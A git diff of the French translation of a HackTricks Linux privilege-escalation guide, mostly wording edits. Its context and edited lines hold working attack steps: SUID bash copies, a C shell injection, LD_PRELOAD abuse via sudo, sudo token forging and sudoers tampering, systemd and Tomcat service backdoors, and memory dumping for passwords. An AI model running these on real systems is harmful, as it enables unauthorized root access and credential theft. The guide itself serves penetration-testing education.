@@ -8,7 +8,7 @@ Apprenez et pratiquez le Hacking GCP : <img src="../../.gitbook/assets/grte.png"
 
 <summary>Soutenir HackTricks</summary>
 
-* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
@@ -19,7 +19,7 @@ Apprenez et pratiquez le Hacking GCP : <img src="../../.gitbook/assets/grte.png"
 
 ### Infos OS
 
-Commençons par acquérir des connaissances sur le système d'exploitation en cours d'exécution.
+Commençons à acquérir des connaissances sur le système d'exploitation en cours d'exécution.
 ```bash
 (cat /proc/version || uname -a ) 2>/dev/null
 lsb_release -a 2>/dev/null # old, not by default on many systems
@@ -88,7 +88,7 @@ sudo -u#-1 /bin/bash
 ```
 ### Dmesg signature verification failed
 
-Vérifiez la **boîte smasher2 de HTB** pour un **exemple** de la façon dont cette vulnérabilité pourrait être exploitée.
+Vérifiez la **boîte smasher2 de HTB** pour un **exemple** de la façon dont cette vulnérabilité pourrait être exploitée
 ```bash
 dmesg 2>/dev/null | grep "signature"
 ```
@@ -157,11 +157,11 @@ grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc
 ```bash
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
-Aussi, vérifiez si **un compilateur est installé**. Cela est utile si vous devez utiliser une exploitation du noyau car il est recommandé de le compiler sur la machine où vous allez l'utiliser (ou sur une machine similaire).
+Aussi, vérifiez si **un compilateur est installé**. Cela est utile si vous devez utiliser une exploitation du noyau, car il est recommandé de le compiler sur la machine où vous allez l'utiliser (ou sur une similaire).
 ```bash
 (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
 ```
-### Logiciel vulnérable installé
+### Logiciels vulnérables installés
 
 Vérifiez la **version des paquets et services installés**. Il se peut qu'il y ait une ancienne version de Nagios (par exemple) qui pourrait être exploitée pour élever les privilèges…\
 Il est recommandé de vérifier manuellement la version des logiciels installés les plus suspects.
@@ -192,7 +192,7 @@ Vous pouvez utiliser des outils comme [**pspy**](https://github.com/DominicBreuk
 
 ### Mémoire des processus
 
-Certains services d'un serveur enregistrent **des identifiants en texte clair dans la mémoire**.\
+Certains services d'un serveur sauvegardent **des identifiants en texte clair dans la mémoire**.\
 Normalement, vous aurez besoin de **privilèges root** pour lire la mémoire des processus appartenant à d'autres utilisateurs, donc cela est généralement plus utile lorsque vous êtes déjà root et souhaitez découvrir plus d'identifiants.\
 Cependant, rappelez-vous que **en tant qu'utilisateur régulier, vous pouvez lire la mémoire des processus que vous possédez**.
 
@@ -201,9 +201,9 @@ Notez qu'aujourd'hui, la plupart des machines **ne permettent pas ptrace par dé
 
 Le fichier _**/proc/sys/kernel/yama/ptrace\_scope**_ contrôle l'accessibilité de ptrace :
 
-* **kernel.yama.ptrace\_scope = 0** : tous les processus peuvent être débogués, tant qu'ils ont le même uid. C'est la manière classique dont ptracing fonctionnait.
+* **kernel.yama.ptrace\_scope = 0** : tous les processus peuvent être débogués, tant qu'ils ont le même uid. C'est la manière classique dont le ptracing fonctionnait.
 * **kernel.yama.ptrace\_scope = 1** : seul un processus parent peut être débogué.
-* **kernel.yama.ptrace\_scope = 2** : seul l'admin peut utiliser ptrace, car cela nécessite la capacité CAP\_SYS\_PTRACE.
+* **kernel.yama.ptrace\_scope = 2** : seul l'administrateur peut utiliser ptrace, car cela nécessite la capacité CAP\_SYS\_PTRACE.
 * **kernel.yama.ptrace\_scope = 3** : Aucun processus ne peut être tracé avec ptrace. Une fois défini, un redémarrage est nécessaire pour réactiver le ptracing.
 {% endhint %}
 
@@ -235,7 +235,7 @@ done
 
 #### /proc/$pid/maps & /proc/$pid/mem
 
-Pour un identifiant de processus donné, **maps montre comment la mémoire est mappée dans l'espace d'adresses virtuelles de ce processus** ; cela montre également les **permissions de chaque région mappée**. Le **fichier pseudo mem expose la mémoire des processus elle-même**. À partir du fichier **maps**, nous savons quelles **régions de mémoire sont lisibles** et leurs décalages. Nous utilisons ces informations pour **chercher dans le fichier mem et déverser toutes les régions lisibles** dans un fichier.
+Pour un identifiant de processus donné, **maps montre comment la mémoire est mappée dans l'espace d'adresses virtuelles de ce processus** ; il montre également les **permissions de chaque région mappée**. Le **fichier pseudo mem expose la mémoire des processus elle-même**. À partir du fichier **maps**, nous savons quelles **régions de mémoire sont lisibles** et leurs décalages. Nous utilisons ces informations pour **chercher dans le fichier mem et extraire toutes les régions lisibles** dans un fichier.
 ```bash
 procdump()
 (
@@ -308,16 +308,16 @@ strings *.dump | grep -i password
 ```
 #### mimipenguin
 
-L'outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler des identifiants en texte clair de la mémoire** et de certains **fichiers bien connus**. Il nécessite des privilèges root pour fonctionner correctement.
+L'outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler des identifiants en texte clair depuis la mémoire** et depuis certains **fichiers bien connus**. Il nécessite des privilèges root pour fonctionner correctement.
 
-| Fonctionnalité                                      | Nom du processus      |
-| --------------------------------------------------- | --------------------- |
-| Mot de passe GDM (Kali Desktop, Debian Desktop)     | gdm-password          |
-| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)   | gnome-keyring-daemon  |
-| LightDM (Ubuntu Desktop)                            | lightdm               |
-| VSFTPd (Connexions FTP Actives)                     | vsftpd                |
-| Apache2 (Sessions HTTP Basic Auth Actives)          | apache2               |
-| OpenSSH (Sessions SSH Actives - Utilisation de Sudo) | sshd:                 |
+| Fonctionnalité                                     | Nom du Processus     |
+| ------------------------------------------------- | -------------------- |
+| Mot de passe GDM (Kali Desktop, Debian Desktop)   | gdm-password         |
+| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
+| LightDM (Ubuntu Desktop)                          | lightdm              |
+| VSFTPd (Connexions FTP Actives)                   | vsftpd               |
+| Apache2 (Sessions HTTP Basic Auth Actives)        | apache2              |
+| OpenSSH (Sessions SSH Actives - Utilisation de Sudo)| sshd:                |
 
 #### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
 ```bash
@@ -333,9 +333,9 @@ Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
 # finding secrets
 # results in /tmp/tmp.o6HV0Pl3fe/results.txt
 ```
-## Tâches planifiées/Cron
+## Scheduled/Cron jobs
 
-Vérifiez si une tâche planifiée est vulnérable. Peut-être pouvez-vous tirer parti d'un script exécuté par root (vulnérabilité par joker ? peut modifier des fichiers utilisés par root ? utiliser des liens symboliques ? créer des fichiers spécifiques dans le répertoire utilisé par root ?).
+Vérifiez si un travail planifié est vulnérable. Peut-être pouvez-vous tirer parti d'un script exécuté par root (vulnérabilité par joker ? peut modifier des fichiers utilisés par root ? utiliser des liens symboliques ? créer des fichiers spécifiques dans le répertoire utilisé par root ?).
 ```bash
 crontab -l
 ls -al /etc/cron* /etc/at*
@@ -356,7 +356,7 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
 ```
 ### Cron utilisant un script avec un caractère générique (Injection de caractère générique)
 
-Si un script exécuté par root contient un “**\***” à l'intérieur d'une commande, vous pourriez en profiter pour provoquer des choses inattendues (comme une élévation de privilèges). Exemple :
+Si un script exécuté par root contient un “**\***” à l'intérieur d'une commande, vous pourriez en profiter pour provoquer des choses inattendues (comme privesc). Exemple :
 ```bash
 rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
 ```
@@ -382,9 +382,9 @@ ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
 ### Tâches cron fréquentes
 
-Vous pouvez surveiller les processus pour rechercher des processus qui sont exécutés toutes les 1, 2 ou 5 minutes. Peut-être pouvez-vous en profiter et élever les privilèges.
+Vous pouvez surveiller les processus pour rechercher des processus qui s'exécutent toutes les 1, 2 ou 5 minutes. Peut-être pouvez-vous en profiter et élever les privilèges.
 
-Par exemple, pour **surveiller toutes les 0,1s pendant 1 minute**, **trier par les commandes les moins exécutées** et supprimer les commandes qui ont été exécutées le plus, vous pouvez faire :
+Par exemple, pour **surveiller toutes les 0,1 secondes pendant 1 minute**, **trier par les commandes les moins exécutées** et supprimer les commandes qui ont été exécutées le plus, vous pouvez faire :
 ```bash
 for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
 ```
@@ -419,13 +419,13 @@ ExecStart=faraday-server
 ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
 ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
 ```
-Ensuite, créez un **exécutable** avec le **même nom que le binaire du chemin relatif** à l'intérieur du dossier PATH de systemd dans lequel vous pouvez écrire, et lorsque le service est demandé pour exécuter l'action vulnérable (**Démarrer**, **Arrêter**, **Recharger**), votre **porte dérobée sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter des services, mais vérifiez si vous pouvez utiliser `sudo -l`).
+Alors, créez un **exécutable** avec le **même nom que le binaire du chemin relatif** à l'intérieur du dossier PATH de systemd dans lequel vous pouvez écrire, et lorsque le service est demandé pour exécuter l'action vulnérable (**Démarrer**, **Arrêter**, **Recharger**), votre **porte dérobée sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter des services, mais vérifiez si vous pouvez utiliser `sudo -l`).
 
 **En savoir plus sur les services avec `man systemd.service`.**
 
 ## **Minuteries**
 
-Les **minuteries** sont des fichiers d'unité systemd dont le nom se termine par `**.timer**` qui contrôlent les fichiers ou événements `**.service**`. Les **minuteries** peuvent être utilisées comme une alternative à cron car elles ont un support intégré pour les événements de temps calendaire et les événements de temps monotone et peuvent être exécutées de manière asynchrone.
+Les **minuteries** sont des fichiers d'unité systemd dont le nom se termine par `**.timer**` qui contrôlent les fichiers ou événements `**.service**`. Les **minuteries** peuvent être utilisées comme une alternative à cron car elles ont un support intégré pour les événements de temps calendaire et les événements de temps monotoniques et peuvent être exécutées de manière asynchrone.
 
 Vous pouvez énumérer toutes les minuteries avec :
 ```bash
@@ -433,7 +433,7 @@ systemctl list-timers --all
 ```
 ### Timers modifiables
 
-Si vous pouvez modifier un minuteur, vous pouvez le faire exécuter certaines instances de systemd.unit (comme un `.service` ou un `.target`)
+Si vous pouvez modifier un timer, vous pouvez le faire exécuter certaines instances de systemd.unit (comme un `.service` ou un `.target`)
 ```bash
 Unit=backdoor.service
 ```
@@ -444,7 +444,7 @@ Dans la documentation, vous pouvez lire ce qu'est l'unité :
 Par conséquent, pour abuser de cette permission, vous devez :
 
 * Trouver une unité systemd (comme un `.service`) qui **exécute un binaire modifiable**
-* Trouver une unité systemd qui **exécute un chemin relatif** et vous avez **des privilèges d'écriture** sur le **CHEMIN systemd** (pour usurper cet exécutable)
+* Trouver une unité systemd qui **exécute un chemin relatif** et sur laquelle vous avez **des privilèges d'écriture** sur le **CHEMIN systemd** (pour usurper cet exécutable)
 
 **En savoir plus sur les minuteurs avec `man systemd.timer`.**
 
@@ -459,28 +459,28 @@ Notez que le **timer** est **activé** en créant un lien symbolique vers celui-
 
 ## Sockets
 
-Les Unix Domain Sockets (UDS) permettent la **communication entre processus** sur les mêmes machines ou différentes dans des modèles client-serveur. Ils utilisent des fichiers de descripteur Unix standard pour la communication inter-ordinateurs et sont configurés via des fichiers `.socket`.
+Les Unix Domain Sockets (UDS) permettent la **communication entre processus** sur la même machine ou sur des machines différentes dans des modèles client-serveur. Ils utilisent des fichiers de descripteur Unix standard pour la communication inter-ordinateur et sont configurés via des fichiers `.socket`.
 
 Les sockets peuvent être configurés à l'aide de fichiers `.socket`.
 
 **En savoir plus sur les sockets avec `man systemd.socket`.** Dans ce fichier, plusieurs paramètres intéressants peuvent être configurés :
 
 * `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction` : Ces options sont différentes mais un résumé est utilisé pour **indiquer où il va écouter** le socket (le chemin du fichier socket AF_UNIX, l'IPv4/6 et/ou le numéro de port à écouter, etc.)
-* `Accept` : Prend un argument booléen. Si **vrai**, une **instance de service est créée pour chaque connexion entrante** et seul le socket de connexion lui est passé. Si **faux**, tous les sockets d'écoute eux-mêmes sont **passés à l'unité de service démarrée**, et une seule unité de service est créée pour toutes les connexions. Cette valeur est ignorée pour les sockets datagram et les FIFOs où une seule unité de service gère inconditionnellement tout le trafic entrant. **Par défaut, c'est faux**. Pour des raisons de performance, il est recommandé d'écrire de nouveaux démons uniquement d'une manière adaptée à `Accept=no`.
+* `Accept` : Prend un argument booléen. Si **vrai**, une **instance de service est créée pour chaque connexion entrante** et seul le socket de connexion lui est passé. Si **faux**, tous les sockets d'écoute eux-mêmes sont **passés à l'unité de service démarrée**, et une seule unité de service est créée pour toutes les connexions. Cette valeur est ignorée pour les sockets datagram et les FIFOs où une seule unité de service gère inconditionnellement tout le trafic entrant. **Par défaut, c'est faux**. Pour des raisons de performance, il est recommandé d'écrire de nouveaux démons uniquement d'une manière qui convient à `Accept=no`.
 * `ExecStartPre`, `ExecStartPost` : Prend une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** que les **sockets**/FIFOs d'écoute soient **créés** et liés, respectivement. Le premier token de la ligne de commande doit être un nom de fichier absolu, suivi d'arguments pour le processus.
 * `ExecStopPre`, `ExecStopPost` : Commandes supplémentaires qui sont **exécutées avant** ou **après** que les **sockets**/FIFOs d'écoute soient **fermés** et supprimés, respectivement.
 * `Service` : Spécifie le nom de l'unité de **service** **à activer** sur le **trafic entrant**. Ce paramètre n'est autorisé que pour les sockets avec Accept=no. Il par défaut au service qui porte le même nom que le socket (avec le suffixe remplacé). Dans la plupart des cas, il ne devrait pas être nécessaire d'utiliser cette option.
 
 ### Fichiers .socket écrits
 
-Si vous trouvez un fichier `.socket` **écrit**, vous pouvez **ajouter** au début de la section `[Socket]` quelque chose comme : `ExecStartPre=/home/kali/sys/backdoor` et la porte dérobée sera exécutée avant que le socket ne soit créé. Par conséquent, vous devrez **probablement attendre que la machine redémarre.**\
+Si vous trouvez un fichier `.socket` **écrit**, vous pouvez **ajouter** au début de la section `[Socket]` quelque chose comme : `ExecStartPre=/home/kali/sys/backdoor` et la porte dérobée sera exécutée avant que le socket ne soit créé. Par conséquent, vous **devrez probablement attendre que la machine redémarre.**\
 &#xNAN;_&#x4E;otez que le système doit utiliser cette configuration de fichier socket ou la porte dérobée ne sera pas exécutée_
 
 ### Sockets écrits
 
-Si vous **identifiez un socket écrivable** (_nous parlons maintenant des Unix Sockets et non des fichiers de config `.socket`_), alors **vous pouvez communiquer** avec ce socket et peut-être exploiter une vulnérabilité.
+Si vous **identifiez un socket écrivable** (_nous parlons maintenant des Sockets Unix et non des fichiers de config `.socket`_), alors **vous pouvez communiquer** avec ce socket et peut-être exploiter une vulnérabilité.
 
-### Énumérer les Unix Sockets
+### Énumérer les Sockets Unix
 ```bash
 netstat -a -p --unix
 ```
@@ -554,9 +554,9 @@ Après avoir configuré la connexion `socat`, vous pouvez exécuter des commande
 
 ### Autres
 
-Notez que si vous avez des permissions d'écriture sur le socket docker parce que vous êtes **dans le groupe `docker`**, vous avez [**plus de façons d'escalader les privilèges**](interesting-groups-linux-pe/#docker-group). Si l'[**API docker écoute sur un port**, vous pouvez également être en mesure de la compromettre](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
+Notez que si vous avez des permissions d'écriture sur le socket docker parce que vous êtes **dans le groupe `docker`**, vous avez [**plus de moyens d'escalader les privilèges**](interesting-groups-linux-pe/#docker-group). Si l' [**API docker écoute sur un port** vous pouvez également être en mesure de la compromettre](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
 
-Vérifiez **plus de façons de sortir de docker ou de l'abuser pour escalader les privilèges** dans :
+Vérifiez **plus de moyens de sortir de docker ou de l'abuser pour escalader les privilèges** dans :
 
 {% content-ref url="docker-security/" %}
 [docker-security](docker-security/)
@@ -580,7 +580,7 @@ Si vous constatez que vous pouvez utiliser la commande **`runc`**, lisez la page
 
 ## **D-Bus**
 
-D-Bus est un **système de communication inter-processus (IPC)** sophistiqué qui permet aux applications d'interagir et de partager des données de manière efficace. Conçu avec le système Linux moderne à l'esprit, il offre un cadre robuste pour différentes formes de communication entre applications.
+D-Bus est un système sophistiqué de **communication inter-processus (IPC)** qui permet aux applications d'interagir efficacement et de partager des données. Conçu avec le système Linux moderne à l'esprit, il offre un cadre robuste pour différentes formes de communication entre applications.
 
 Le système est polyvalent, prenant en charge l'IPC de base qui améliore l'échange de données entre processus, rappelant les **sockets de domaine UNIX améliorés**. De plus, il aide à diffuser des événements ou des signaux, favorisant une intégration transparente entre les composants du système. Par exemple, un signal d'un démon Bluetooth concernant un appel entrant peut inciter un lecteur de musique à se mettre en sourdine, améliorant l'expérience utilisateur. En outre, D-Bus prend en charge un système d'objets distants, simplifiant les demandes de services et les invocations de méthodes entre applications, rationalisant des processus qui étaient traditionnellement complexes.
 
@@ -827,7 +827,7 @@ Puis **compilez-le** en utilisant :
 cd /tmp
 gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-Enfin, **escalader les privilèges** en exécutant
+Enfin, **escalate privileges** en cours d'exécution
 ```bash
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
@@ -872,7 +872,7 @@ void inject(){
 system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
-Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions de fichiers et en exécutant un shell avec des privilèges élevés.
+Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions de fichier et en exécutant un shell avec des privilèges élevés.
 
 Compilez le fichier C ci-dessus en un fichier d'objet partagé (.so) avec :
 ```bash
@@ -911,7 +911,7 @@ cela signifie que la bibliothèque que vous avez générée doit avoir une fonct
 
 ### GTFOBins
 
-[**GTFOBins**](https://gtfobins.github.io) est une liste soigneusement sélectionnée de binaires Unix qui peuvent être exploités par un attaquant pour contourner les restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est la même chose mais pour les cas où vous pouvez **uniquement injecter des arguments** dans une commande.
+[**GTFOBins**](https://gtfobins.github.io) est une liste sélectionnée de binaires Unix qui peuvent être exploités par un attaquant pour contourner les restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est la même chose mais pour les cas où vous pouvez **uniquement injecter des arguments** dans une commande.
 
 Le projet collecte des fonctions légitimes de binaires Unix qui peuvent être abusées pour sortir de shells restreints, élever ou maintenir des privilèges élevés, transférer des fichiers, créer des shells bind et reverse, et faciliter d'autres tâches post-exploitation.
 
@@ -961,7 +961,7 @@ sudo su
 ```
 ### /var/run/sudo/ts/\<Username>
 
-Si vous avez **des permissions d'écriture** dans le dossier ou sur l'un des fichiers créés à l'intérieur du dossier, vous pouvez utiliser le binaire [**write\_sudo\_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un jeton sudo pour un utilisateur et un PID**.\
+Si vous avez **des permissions d'écriture** dans le dossier ou sur l'un des fichiers créés à l'intérieur du dossier, vous pouvez utiliser le binaire [**write\_sudo\_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un token sudo pour un utilisateur et un PID**.\
 Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et que vous avez un shell en tant que cet utilisateur avec le PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin de connaître le mot de passe en faisant :
 ```bash
 ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
@@ -988,7 +988,7 @@ echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
 ```
 ### DOAS
 
-Il existe des alternatives au binaire `sudo` telles que `doas` pour OpenBSD, n'oubliez pas de vérifier sa configuration dans `/etc/doas.conf`
+Il existe quelques alternatives au binaire `sudo`, comme `doas` pour OpenBSD, n'oubliez pas de vérifier sa configuration dans `/etc/doas.conf`
 ```
 permit nopass demo as root cmd vim
 ```
@@ -1061,7 +1061,7 @@ setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
 }
 ```
-## Capabilities
+## Capacités
 
 Les capacités Linux fournissent un **sous-ensemble des privilèges root disponibles à un processus**. Cela divise effectivement les **privilèges root en unités plus petites et distinctes**. Chacune de ces unités peut ensuite être accordée indépendamment aux processus. De cette manière, l'ensemble complet des privilèges est réduit, diminuant les risques d'exploitation.\
 Lisez la page suivante pour **en savoir plus sur les capacités et comment les abuser** :
@@ -1070,14 +1070,14 @@ Lisez la page suivante pour **en savoir plus sur les capacités et comment les a
 [linux-capabilities.md](linux-capabilities.md)
 {% endcontent-ref %}
 
-## Directory permissions
+## Permissions de répertoire
 
 Dans un répertoire, le **bit pour "exécuter"** implique que l'utilisateur concerné peut "**cd**" dans le dossier.\
-Le **bit "lire"** implique que l'utilisateur peut **lister** les **fichiers**, et le **bit "écrire"** implique que l'utilisateur peut **supprimer** et **créer** de nouveaux **fichiers**.
+Le bit **"lire"** implique que l'utilisateur peut **lister** les **fichiers**, et le bit **"écrire"** implique que l'utilisateur peut **supprimer** et **créer** de nouveaux **fichiers**.
 
 ## ACLs
 
-Les listes de contrôle d'accès (ACL) représentent la couche secondaire de permissions discrétionnaires, capables de **remplacer les permissions traditionnelles ugo/rwx**. Ces permissions améliorent le contrôle sur l'accès aux fichiers ou aux répertoires en permettant ou en refusant des droits à des utilisateurs spécifiques qui ne sont pas les propriétaires ou membres du groupe. Ce niveau de **granularité assure une gestion d'accès plus précise**. Des détails supplémentaires peuvent être trouvés [**ici**](https://linuxconfig.org/how-to-manage-acls-on-linux).
+Les listes de contrôle d'accès (ACLs) représentent la couche secondaire de permissions discrétionnaires, capables de **remplacer les permissions traditionnelles ugo/rwx**. Ces permissions améliorent le contrôle sur l'accès aux fichiers ou aux répertoires en permettant ou en refusant des droits à des utilisateurs spécifiques qui ne sont pas les propriétaires ou membres du groupe. Ce niveau de **granularité assure une gestion d'accès plus précise**. Des détails supplémentaires peuvent être trouvés [**ici**](https://linuxconfig.org/how-to-manage-acls-on-linux).
 
 **Donner** à l'utilisateur "kali" des permissions de lecture et d'écriture sur un fichier :
 ```bash
@@ -1093,7 +1093,7 @@ getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ## Open shell sessions
 
 Dans les **anciennes versions**, vous pouvez **dérober** certaines sessions **shell** d'un autre utilisateur (**root**).\
-Dans les **dernières versions**, vous ne pourrez **vous connecter** qu'aux sessions screen de **votre propre utilisateur**. Cependant, vous pourriez trouver **des informations intéressantes à l'intérieur de la session**.
+Dans les **nouvelles versions**, vous ne pourrez **vous connecter** qu'aux sessions screen de **votre propre utilisateur**. Cependant, vous pourriez trouver **des informations intéressantes à l'intérieur de la session**.
 
 ### screen sessions hijacking
 
@@ -1192,7 +1192,7 @@ Le fichier `/etc/profile` et les fichiers sous `/etc/profile.d/` sont **des scri
 ```bash
 ls -l /etc/profile /etc/profile.d/
 ```
-Si un script de profil étrange est trouvé, vous devriez le vérifier pour **des détails sensibles**.
+Si un script de profil étrange est trouvé, vous devriez vérifier s'il contient des **détails sensibles**.
 
 ### Fichiers Passwd/Shadow
 
@@ -1236,7 +1236,7 @@ Vous devez vérifier si vous pouvez **écrire dans certains fichiers sensibles**
 find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
 for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
 ```
-Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat à l'intérieur de /etc/systemd/,** alors vous pouvez modifier les lignes :
+Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat dans /etc/systemd/,** alors vous pouvez modifier les lignes :
 ```
 ExecStart=/path/to/backdoor
 User=root
@@ -1246,11 +1246,11 @@ Votre porte dérobée sera exécutée la prochaine fois que tomcat sera démarr�
 
 ### Vérifier les Dossiers
 
-Les dossiers suivants peuvent contenir des sauvegardes ou des informations intéressantes : **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablement vous ne pourrez pas lire le dernier mais essayez)
+Les dossiers suivants peuvent contenir des sauvegardes ou des informations intéressantes : **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablement, vous ne pourrez pas lire le dernier mais essayez)
 ```bash
 ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 ```
-### Fichiers de localisation étrange/propriétés détenues
+### Fichiers de localisation étrange/propriétés
 ```bash
 #root owned files in /home folders
 find /home -user root 2>/dev/null
@@ -1327,14 +1327,14 @@ Pour **lire les journaux, le groupe** [**adm**](interesting-groups-linux-pe/#adm
 ```
 ### Recherche de crédentiels génériques/Regex
 
-Vous devriez également vérifier les fichiers contenant le mot "**password**" dans son **nom** ou à l'intérieur du **contenu**, et également vérifier les IP et les emails dans les logs, ou les regexps de hachages.\
+Vous devriez également vérifier les fichiers contenant le mot "**password**" dans son **nom** ou à l'intérieur du **contenu**, et également vérifier les IP et les emails dans les journaux, ou les regexps de hachages.\
 Je ne vais pas lister ici comment faire tout cela, mais si vous êtes intéressé, vous pouvez consulter les dernières vérifications que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) effectue.
 
 ## Fichiers écriture
 
 ### Détournement de bibliothèque Python
 
-Si vous savez **d'où** un script python va être exécuté et que vous **pouvez écrire à l'intérieur** de ce dossier ou que vous pouvez **modifier les bibliothèques python**, vous pouvez modifier la bibliothèque OS et y insérer une porte dérobée (si vous pouvez écrire là où le script python va être exécuté, copiez et collez la bibliothèque os.py).
+Si vous savez **d'où** un script python va être exécuté et que vous **pouvez écrire dans** ce dossier ou que vous pouvez **modifier les bibliothèques python**, vous pouvez modifier la bibliothèque OS et y insérer une porte dérobée (si vous pouvez écrire là où le script python va être exécuté, copiez et collez la bibliothèque os.py).
 
 Pour **insérer une porte dérobée dans la bibliothèque**, ajoutez simplement à la fin de la bibliothèque os.py la ligne suivante (changez IP et PORT) :
 ```python
@@ -1358,7 +1358,7 @@ Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cve
 
 **Référence de vulnérabilité :** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
 
-Si, pour une raison quelconque, un utilisateur est capable de **crire** un script `ifcf-<whatever>` dans _/etc/sysconfig/network-scripts_ **ou** peut **ajuster** un existant, alors votre **système est compromis**.
+Si, pour une raison quelconque, un utilisateur est capable de **écrire** un script `ifcf-<whatever>` dans _/etc/sysconfig/network-scripts_ **ou** peut **ajuster** un existant, alors votre **système est compromis**.
 
 Les scripts réseau, _ifcg-eth0_ par exemple, sont utilisés pour les connexions réseau. Ils ressemblent exactement à des fichiers .INI. Cependant, ils sont \~sourced\~ sur Linux par Network Manager (dispatcher.d).
 
@@ -1420,7 +1420,7 @@ D'autre part, `/etc/init` est associé à **Upstart**, une **gestion de services
 **Mestaploit :** _**multi/recon/local\_exploit\_suggester**_\
 **Suggesteur d'exploits Linux :** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
 **EvilAbigail (accès physique) :** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
-**Recopilation de plus de scripts** : [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
+**Recueil de plus de scripts** : [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
 
 ## Références
 
@@ -1451,8 +1451,8 @@ Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/grte.png"
 <summary>Soutenir HackTricks</summary>
 
 * Vérifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
